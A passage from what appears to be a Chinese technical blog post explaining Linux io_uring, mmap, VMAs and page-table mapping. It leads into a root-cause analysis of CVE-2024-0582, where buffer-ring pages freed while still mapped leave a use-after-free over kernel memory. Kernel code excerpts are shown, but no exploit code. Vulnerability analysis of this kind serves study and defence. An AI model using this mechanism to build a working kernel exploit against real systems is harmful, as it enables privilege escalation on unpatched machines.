title="io_uring"></a><code>io_uring</code></h3><p>详细的介绍在<code>man(7)</code>的<a href="https://man7.org/linux/man-pages/man7/io_uring.7.html"><code>io_uring(7)</code></a>。</p><p><code>io_uring</code>是一个真正意义上实现了异步I&#x2F;O的Linux API，它允许用户提交一个或多个 I&#x2F;O 请求，这些请求异步处理，不会阻塞调用进程。io_uring 的名字来源于用户空间和内核空间之间共享的环形缓冲区。这种安排在可能的情况下允许高效的 I&#x2F;O，同时避免了在它们之间复制缓冲区的开销。这个接口使 io_uring 与其他 UNIX I&#x2F;O API 不同，在其他 UNIX I&#x2F;O API 中，不是通过系统调用在内核和用户空间之间进行通信，而是使用环形缓冲区作为主要的通信模式。</p><p>主要工作模型有以下几点：</p><ul><li><p>在用户空间和内核空间之间，通过<code>io_uring_setup()</code>和<code>mmap()</code>建立了环形缓冲区，分别为<code>SQ(submission queue)</code>和<code>CQ(completion queue)</code>。用户可以将<code>I/O</code>请求放到SQ队列，内核将完成的I&#x2F;O调用结果放到CQ队列。</p></li><li><p>对于用户需要进行的每个I&#x2F;O请求（如读取文件、写入文件、接受套接字连接等），创建一个提交队列条目，或SQE，描述需要完成的I&#x2F;O操作，并将其添加到提交队列（SQ）的末尾。本质上，每个I&#x2F;O操作都相当于在没有使用io_uring时所做的系统调用。例如，将操作码设置为IORING_OP_READ的SQE将请求执行类似于read(2)系统调用的读取操作。有关所有支持的操作码及其属性的文档，请参阅io_uring_enter(2)中的操作码文档。根据用户想要请求的操作数量，可以将多个SQE添加到队列中。</p></li><li><p>在提交了一个&#x2F;多个SQE到SQ中后，用户可以调用<code>io_uring_enter()</code>以通知内核可以从<code>SQ</code>中取出调用请求来完成它们。</p></li><li><p>对于您提交的每个SQE，一旦请求处理完成，内核就会在完成队列的末尾放置一个完成队列事件或CQE。对于您在SQ上提交的每个SQE，内核在CQ中放置一个精确匹配的CQE。在您检索到CQE之后，至少您可能对检查CQE结构中的res字段感兴趣，该字段对应于如果您直接使用而没有使用io_uring的系统调用等效的返回值。鉴于io_uring是一个异步接口，errno永远不会用于传递错误信息。相反，res将包含在成功的情况下等效系统调用会返回的内容，在错误的情况下res将包含-errno。例如，如果正常的读取系统调用会返回-1并设置errno为EINVAL，那么res将包含-EINVAL。如果正常的系统调用会返回读取大小为1024，那么res将包含1024。</p></li><li><p>可选地，io_uring_enter(2) 还可以在返回之前等待内核处理指定数量的请求。如果你指定了要等待的完成数，内核会在CQ上放置至少那么多的CQEs，你可以在io_uring_enter(2)返回后立即读取这些CQEs。</p></li><li><p>内核可以以任意顺序完成SQ中存在的I&#x2F;O请求</p></li></ul><h5 id="io-uring-register"><a href="#io-uring-register" class="headerlink" title="io_uring_register()"></a><code>io_uring_register()</code></h5><p>io_uring_register(2) 系统调用注册资源（例如，用户缓冲区、文件、eventfd、个性、限制）以供通过 fd 指引用的 io_uring(7) 实例使用。注册文件或用户缓冲区允许内核对内部数据结构进行长期引用或创建应用程序内存的长期映射，从而大大减少每个 I&#x2F;O 的开销。</p><h5 id="io-uring-enter"><a href="#io-uring-enter" class="headerlink" title="io_uring_enter()"></a><code>io_uring_enter()</code></h5><p>io_uring_enter(2)用于通过io_uring_setup(2)调用设置的共享提交和完成队列来启动和完成I&#x2F;O。单个调用既可以提交新的I&#x2F;O，也可以等待由该调用或之前的io_uring_enter(2)调用启动的I&#x2F;O的完成。</p><h5 id="io-uring-setup"><a href="#io-uring-setup" class="headerlink" title="io_uring_setup()"></a><code>io_uring_setup()</code></h5><p>io_uring_setup(2) 系统调用设置了一个至少包含条目的提交队列（SQ）和完成队列（CQ），并返回一个文件描述符，该描述符可用于在 io_uring 实例上执行后续操作。提交队列和完成队列在用户空间和内核之间共享，从而消除了在启动和完成 I&#x2F;O 时复制数据的需求。</p><h5 id="pbuf和ring-buf"><a href="#pbuf和ring-buf" class="headerlink" title="pbuf和ring_buf"></a><code>pbuf</code>和<code>ring_buf</code></h5><p><code>pbuf</code>是提供式缓冲区，具体调用链为：<br><code>io_uring_register() -&gt; __io_uring_register() -&gt; io_register_pbuf_ring()</code><br>反向管理。用户预先把可用于接收数据的一批 buffer 放到 <strong>buffer ring</strong>；当某个读类请求带 IOSQE_BUFFER_SELECT 时，内核<strong>从 ring 里挑一个</strong>可用缓冲区来写入数据，生命周期清晰且高效。</p><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a><a href="https://man7.org/linux/man-pages/man2/mmap.2.html">mmap</a></h3><p>一个进程的虚拟地址空间主要由两个数据结来描述。一个是最高层次的：mm_struct，一个是较高层次的：vm_area_structs。最高层次的mm_struct结构描述了一个进程的整个虚拟地址空间。较高层次的结构vm_area_truct描述了虚拟地址空间的一个区间（简称虚拟区）。每个进程只有一个mm_struct结构，在每个进程的task_struct结构中，有一个指向该进程的结构。可以说，mm_struct结构是对整个用户空间的描述。可以参考<a href="https://blog.csdn.net/qq_26768741/article/details/54375524">文档</a></p><h5 id="1-mmap-的总体流程（从用户到内核的“登记”过程"><a href="#1-mmap-的总体流程（从用户到内核的“登记”过程" class="headerlink" title="1) mmap 的总体流程（从用户到内核的“登记”过程"></a>1) mmap 的总体流程（从用户到内核的“登记”过程</h5><ol><li><p>用户态调用 <code>mmap()</code>（或 <code>mmap64</code>）：传入起始地址&#x2F;长度&#x2F;权限&#x2F;标志（<code>MAP_SHARED/MAP_PRIVATE/MAP_ANONYMOUS/MAP_FIXED</code> 等）以及可能的 <code>fd/offset</code>。</p></li><li><p>内核处理 <code>mmap</code> 系统调用，最终在进程的 <code>mm_struct</code> 中创建一个或多个 <code>vm_area_struct（VMA）</code>，每个 VMA 描述一个“虚拟地址区间”及其属性（起始&#x2F;结束地址、权限、与文件的关联等）。文档把 VMA 描述为“跟踪用户空间连续虚拟区间”的对象。</p></li><li><p>VMA 只是<strong>元信息</strong>（描述属性和范围），它本身并不直接含有物理页面。真正把虚拟地址映射到物理页的，是页表（page tables）——这些条目（PTE）由内核在<strong>后续阶段</strong>填入，通常在缺页异常(page fault)时或通过驱动&#x2F;内核显式映射函数（如 <code>remap_pfn_range()、vm_insert_page()、vm_insert_pages()</code>）时建立。</p></li></ol><p>简言之：</p><ul><li><p>mmap() → 创建 <code>VMA（vm_area_struct）</code>并登记在 <code>mm_struct</code> 中（逻辑层）。</p></li><li><p>PTE（页表项）决定虚拟地址能否实际访存以及指向哪个物理帧（物理 PFN）。PTE 的建立可以是“懒惰”（fault-on-access）或者“即时”（内核直接插入 PTE）。</p></li></ul><p>可以参考<a href="https://docs.kernel.org/mm/process_addrs.html?utm_source=chatgpt.com">文档</a></p><h5 id="2-什么是vm-area-struct-VMA）"><a href="#2-什么是vm-area-struct-VMA）" class="headerlink" title="2) 什么是vm_area_struct(VMA）"></a>2) 什么是vm_area_struct(VMA）</h5><p>struct vm_area_struct（简称 VMA）是内核用来表示“连续、属性相同的用户虚拟地址区域”的结构体。主要关键信息：</p><ul><li><p><code>vm_start, vm_end</code>：该 VMA 的虚拟地址区间（[start, end)）。</p></li><li><p><code>vm_flags</code>：读&#x2F;写&#x2F;执行等权限位（并影响 fault 时是否允许写）。</p></li><li><p><code>vm_page_prot</code>：页面保护属性（pgprot），用于插入 PTE 时设置访问位&#x2F;缓存属性等。</p></li><li><p><code>vm_file / vm_pgoff</code>：若是 file-backed 映射，这里保存文件对象和偏移。</p></li><li><p><code>vm_ops</code>：如果需要特殊 fault 处理或迁移，这里可以指定 VMA 的操作函数（如 fault 回调）。</p></li><li><p><code>vm_next</code> 等：VMA 链表&#x2F;红黑树中用于连接同一进程的所有 VMA。</p></li></ul><p><code>VMA</code> 代表“这段虚拟地址应该怎样表现”，但它本身不是物理页。实际的数据来自 page cache、匿名页，或内核&#x2F;设备通过显式映射插入的 PTE。</p><h5 id="3-什么是mm-struct"><a href="#3-什么是mm-struct" class="headerlink" title="3)什么是mm_struct"></a>3)什么是<code>mm_struct</code></h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> &#123;</span><br><br>    <span class="hljs-comment">//指向线性区对象的链表头</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> * <span class="hljs-title">mmap</span>;</span>       <span class="hljs-comment">/* list of VMAs */</span><br>    <span class="hljs-comment">//指向线性区对象的红黑树</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rb_root</span> <span class="hljs-title">mm_rb</span>;</span><br>    <span class="hljs-comment">//指向最近找到的虚拟区间</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> * <span class="hljs-title">mmap_cache</span>;</span> <span class="hljs-comment">/* last find_vma result */</span><br><br>    <span class="hljs-comment">//用来在进程地址空间中搜索有效的进程地址空间的函数</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-title function_">long</span> <span class="hljs-params">(*get_unmapped_area)</span> <span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp,</span><br><span class="hljs-params">                <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len,</span><br><span class="hljs-params">                <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pgoff, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags)</span>;<br><br>       <span class="hljs-type">unsigned</span> <span class="hljs-title function_">long</span> <span class="hljs-params">(*get_unmapped_exec_area)</span> <span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp,</span><br><span class="hljs-params">                <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len,</span><br><span class="hljs-params">                <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pgoff, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags)</span>;<br><br>    <span class="hljs-comment">//释放线性区时调用的方法，          </span><br>    <span class="hljs-type">void</span> (*unmap_area) (<span class="hljs-keyword">struct</span> mm_struct *mm, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr);<br><br>    <span class="hljs-comment">//标识第一个分配文件内存映射的线性地址</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> mmap_base;        <span class="hljs-comment">/* base of mmap area */</span><br><br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> task_size;        <span class="hljs-comment">/* size of task vm space */</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * RHEL6 special for bug 790921: this same variable can mean</span><br><span class="hljs-comment">     * two different things. If sysctl_unmap_area_factor is zero,</span><br><span class="hljs-comment">     * this means the largest hole below free_area_cache. If the</span><br><span class="hljs-comment">     * sysctl is set to a positive value, this variable is used</span><br><span class="hljs-comment">     * to count how much memory has been munmapped from this process</span><br><span class="hljs-comment">     * since the last time free_area_cache was reset back to mmap_base.</span><br><span class="hljs-comment">     * This is ugly, but necessary to preserve kABI.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cached_hole_size;<br><br>    <span class="hljs-comment">//内核进程搜索进程地址空间中线性地址的空间空间</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> free_area_cache;      <span class="hljs-comment">/* first hole of size cached_hole_size or larger */</span><br><br>    <span class="hljs-comment">//指向页表的目录</span><br>    <span class="hljs-type">pgd_t</span> * pgd;<br><br>    <span class="hljs-comment">//共享进程时的个数</span><br>    <span class="hljs-type">atomic_t</span> mm_users;          <span class="hljs-comment">/* How many users with user space? */</span><br><br>    <span class="hljs-comment">//内存描述符的主使用计数器，采用引用计数的原理，当为0时代表无用户再次使用</span><br>    <span class="hljs-type">atomic_t</span> mm_count;          <span class="hljs-comment">/* How many references to &quot;struct mm_struct&quot; (users count as 1) */</span><br><br>    <span class="hljs-comment">//线性区的个数</span><br>    <span class="hljs-type">int</span> map_count;              <span class="hljs-comment">/* number of VMAs */</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rw_semaphore</span> <span class="hljs-title">mmap_sem</span>;</span><br><br>    <span class="hljs-comment">//保护任务页表和引用计数的锁</span><br>    <span class="hljs-type">spinlock_t</span> page_table_lock;     <span class="hljs-comment">/* Protects page tables and some counters */</span><br><br>    <span class="hljs-comment">//mm_struct结构，第一个成员就是初始化的mm_struct结构，</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">mmlist</span>;</span>        <span class="hljs-comment">/* List of maybe swapped mm&#x27;s.  These are globally strung</span><br><span class="hljs-comment">                         * together off init_mm.mmlist, and are protected</span><br><span class="hljs-comment">                         * by mmlist_lock</span><br><span class="hljs-comment">                         */</span><br><br>    <span class="hljs-comment">/* Special counters, in some configurations protected by the</span><br><span class="hljs-comment">     * page_table_lock, in other configurations by being atomic.</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-type">mm_counter_t</span> _file_rss;<br>    <span class="hljs-type">mm_counter_t</span> _anon_rss;<br>    <span class="hljs-type">mm_counter_t</span> _swap_usage;<br><br>    <span class="hljs-comment">//进程拥有的最大页表数目</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> hiwater_rss;  <span class="hljs-comment">/* High-watermark of RSS usage */</span>、<br>    <span class="hljs-comment">//进程线性区的最大页表数目</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> hiwater_vm;   <span class="hljs-comment">/* High-water virtual memory usage */</span><br><br>    <span class="hljs-comment">//进程地址空间的大小，锁住无法换页的个数，共享文件内存映射的页数，可执行内存映射中的页数</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> total_vm, locked_vm, shared_vm, exec_vm;<br>    <span class="hljs-comment">//用户态堆栈的页数，</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_vm, reserved_vm, def_flags, nr_ptes;<br>    <span class="hljs-comment">//维护代码段和数据段</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start_code, end_code, start_data, end_data;<br>    <span class="hljs-comment">//维护堆和栈</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start_brk, brk, start_stack;<br>    <span class="hljs-comment">//维护命令行参数，命令行参数的起始地址和最后地址，以及环境变量的起始地址和最后地址</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg_start, arg_end, env_start, env_end;<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> saved_auxv[AT_VECTOR_SIZE]; <span class="hljs-comment">/* for /proc/PID/auxv */</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">linux_binfmt</span> *<span class="hljs-title">binfmt</span>;</span><br><br>    <span class="hljs-type">cpumask_t</span> cpu_vm_mask;<br><br>    <span class="hljs-comment">/* Architecture-specific MM context */</span><br>    <span class="hljs-type">mm_context_t</span> context;<br><br>    <span class="hljs-comment">/* Swap token stuff */</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Last value of global fault stamp as seen by this process.</span><br><span class="hljs-comment">     * In other words, this value gives an indication of how long</span><br><span class="hljs-comment">     * it has been since this task got the token.</span><br><span class="hljs-comment">     * Look at mm/thrash.c</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> faultstamp;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> token_priority;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> last_interval;<br><br>    <span class="hljs-comment">//线性区的默认访问标志</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags; <span class="hljs-comment">/* Must use atomic bitops to access the bits */</span><br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">core_state</span> *<span class="hljs-title">core_state</span>;</span> <span class="hljs-comment">/* coredumping support */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_AIO</span><br>    <span class="hljs-type">spinlock_t</span>      ioctx_lock;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_head</span>   <span class="hljs-title">ioctx_list</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MM_OWNER</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * &quot;owner&quot; points to a task that is regarded as the canonical</span><br><span class="hljs-comment">     * user/owner of this mm. All of the following must be true in</span><br><span class="hljs-comment">     * order for it to be changed:</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * current == mm-&gt;owner</span><br><span class="hljs-comment">     * current-&gt;mm != mm</span><br><span class="hljs-comment">     * new_owner-&gt;mm == mm</span><br><span class="hljs-comment">     * new_owner-&gt;alloc_lock is held</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">owner</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PROC_FS</span><br>    <span class="hljs-comment">/* store ref to file /proc/&lt;pid&gt;/exe symlink points to */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">exe_file</span>;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> num_exe_file_vmas;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MMU_NOTIFIER</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mmu_notifier_mm</span> *<span class="hljs-title">mmu_notifier_mm</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_TRANSPARENT_HUGEPAGE</span><br>    <span class="hljs-type">pgtable_t</span> pmd_huge_pte; <span class="hljs-comment">/* protected by page_table_lock */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-comment">/* reserved for Red Hat */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __GENKSYMS__</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rh_reserved[<span class="hljs-number">2</span>];<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-comment">/* How many tasks sharing this mm are OOM_DISABLE */</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> rh_reserved_aux;<br>        <span class="hljs-type">atomic_t</span> oom_disable_count;<br>    &#125;;<br><br>    <span class="hljs-comment">/* base of lib map area (ASCII armour) */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> shlib_base;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><h5 id="4-虚拟地址到真实页（PFN-struct-page-PTE）之间的关系（流程与差异）"><a href="#4-虚拟地址到真实页（PFN-struct-page-PTE）之间的关系（流程与差异）" class="headerlink" title="4) 虚拟地址到真实页（PFN &#x2F; struct page &#x2F; PTE）之间的关系（流程与差异）"></a>4) 虚拟地址到真实页（PFN &#x2F; struct page &#x2F; PTE）之间的关系（流程与差异）</h5><p>下面是几类常见映射方式与差别：</p><p>A. 文件&#x2F;页缓存（file-backed）映射（常见）</p><ul><li><p>在缺页时，内核从 page cache 找 struct page（或从磁盘读入并分配 struct page），然后把 struct page 的 PFN 插入到页表（PTE），同时增加 page 的引用计数（refcount）。</p></li><li><p>这种映射会把 struct page 与 PTE 绑定，并且 struct page 的生命周期（refcount）会保护页面在内核对象中不能被错误释放。</p></li></ul><p>B. 匿名（zero-on-demand）映射</p><ul><li>在缺页时，内核分配一个新的 struct page（清零或按配置），把它插入 PTE，并增加 refcount。和 file-backed 类似，PTE 的存在和 struct page 的引用维系着页面不被释放。</li></ul><p>C. 驱动或内核主动映射（<code>remap_pfn_range() / vm_insert_page() / vm_insert_pages()</code>）</p><ul><li><p><code>remap_pfn_range(vma, addr, pfn, size, prot)</code>：把一段<strong>连续的物理帧(pfn)</strong> 直接映射到用户虚拟地址区间（用作设备内存、DMA 内存或内核分配的物理页）。它是“将 PFN 写进 PTE”并把这些 PTE 标上适当的访问位&#x2F;缓存位（例如设置 VM_PFNMAP 标志）。<code>remap_pfn_range()</code> 的语义是“把这个物理帧范围暴露给用户”。</p></li><li><p>关键点：<strong>remap_pfn_range() 本身并不自动为每个 PFN 增加对应的 struct page 的引用计数</strong>（因为它基于 PFN 而非 struct page，且经常用于映射设备内存或匿名 kernel memory）。因此这种映射不会像“page-cache 的 fault 路径”那样隐式地保护 struct page 的生命周期。StackOverflow 上也有讨论说明 remap_pfn_range() 是把物理 PFN 直接映射到用户空间。</p></li><li><p><code>vm_insert_page() / vm_insert_pages()</code>：这些接口以 <code>struct page *</code> 为单位插入页表，并<strong>通常会</strong>增加该页的引用计数（因此能保证页面在映射期间不会被释放）。许多驱动&#x2F;子系统在需要“页被 VMA 保持引用”时改用这些接口。社区也有提出把 <code>remap_pfn_range()</code> 的使用替换为 <code>vm_insert_pages()</code> 的补丁来避免生命周期问题。</p></li><li><p><code>remap_pfn_range()</code> &#x3D; “把物理帧号写入页面表（PTE）”，但不自动把“拥有权”交给映射；</p></li><li><p><code>vm_insert_page()</code> &#x3D; “把 page 对象连到 PTE，并把这个 page 的引用计数 +1”，因此映射同时“拥有”该页。</p></li></ul><p>内核若在某处（例如 unregister）执行 <code>put_page_testzero(page) → free_compound_page(page)</code>，且该 put 将 <code>refcount</code> 减到 0，内核会把物理页交还给伙伴系统（free）。但 VMA&#x2F;PTE 仍然存在，用户虚拟地址仍然映射到那个相同的 PFN（页表条目没有被自动清掉）。这就是“映射仍在，但内核认为页已 free”——页面内容会被后续分配新用途覆盖，从而出现<strong>读写任意被新分配对象的内存</strong>（严重 UAF）。这一点正是 CVE-2024-0582 的本质。</p><h3 id="漏洞触发原因"><a href="#漏洞触发原因" class="headerlink" title="漏洞触发原因"></a>漏洞触发原因</h3><h5 id="pbuf内存分配"><a href="#pbuf内存分配" class="headerlink" title="pbuf内存分配"></a><code>pbuf</code>内存分配</h5><p>这里有一个关键标志：<code>IOU_PBUF_RING_MMAP</code>：如果置位，<strong>ring 的内存由内核分配</strong>，随后<strong>用户用 mmap()</strong> 到自己的地址空间来访问&#x2F;填充 ring 元数据（head&#x2F;tail&#x2F;entries 等）；没置位则表示<strong>用户自有页</strong>被 pin 进来。</p><p>![[Pasted image 20250819110146.png]]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">io_uring_buf_reg</span> &#123;</span><br>__u64ring_addr; <span class="hljs-comment">//环地址</span><br>__u32ring_entries; <span class="hljs-comment">//条目数</span><br>__u16bgid; <span class="hljs-comment">//缓冲区id</span><br>__u16flags; <span class="hljs-comment">//标志位</span><br>__u64resv[<span class="hljs-number">3</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>这个结构体中存在一个<code>flags</code>结构，用于判断该缓冲区的分配方式。<br>(1)<code>io_pin_pbuf_ring(&amp;reg, bl)</code></p><ul><li>触发条件：<strong>没有设置 IOU_PBUF_RING_MMAP</strong>。</li><li>逻辑：<ol><li><code>reg.ring_addr</code> 指向用户空间已有内存。    </li><li>内核调用 <code>io_pin_pages()</code> → 实际上调用 <code>pin_user_pages()</code>，把这段用户内存 <code>pin</code> 住（禁止换出，保证 DMA&#x2F;IO 时有效）。</li><li>得到 <code>struct page *</code> 数组，建立 <code>bl-&gt;buf_ring</code> 指针指向这片用户内存。<br>(2)<code>io_alloc_pbuf_ring(&amp;reg, bl)</code></li></ol></li><li>触发条件：<strong>设置了 IOU_PBUF_RING_MMAP</strong>。</li><li>逻辑：<ol><li>内核自己分配一块连续物理内存（通过 alloc_pages()，通常是复合页）。</li><li>bl-&gt;buf_ring 指向这块内核分配的内存。</li><li>设置 bl-&gt;is_mmap &#x3D; 1，表示这块内存后续要允许用户通过 mmap() 映射。</li></ol></li><li>用户接下来调用 <code>mmap() → io_uring_mmap() → remap_pfn_range()</code>，把这块物理页直接映射到用户空间。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">io_alloc_pbuf_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> io_uring_buf_reg *reg,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> io_buffer_list *bl)</span><br>&#123;<br><span class="hljs-type">gfp_t</span> gfp = GFP_KERNEL_ACCOUNT | __GFP_ZERO | __GFP_NOWARN | __GFP_COMP;<br><span class="hljs-type">size_t</span> ring_size;<br><span class="hljs-type">void</span> *ptr;<br><br>ring_size = reg-&gt;ring_entries * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> io_uring_buf_ring);<br>ptr = (<span class="hljs-type">void</span> *) __get_free_pages(gfp, get_order(ring_size));<br><span class="hljs-keyword">if</span> (!ptr)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>bl-&gt;buf_ring = ptr;<br>bl-&gt;is_mapped = <span class="hljs-number">1</span>;<br>bl-&gt;is_mmap = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> <span 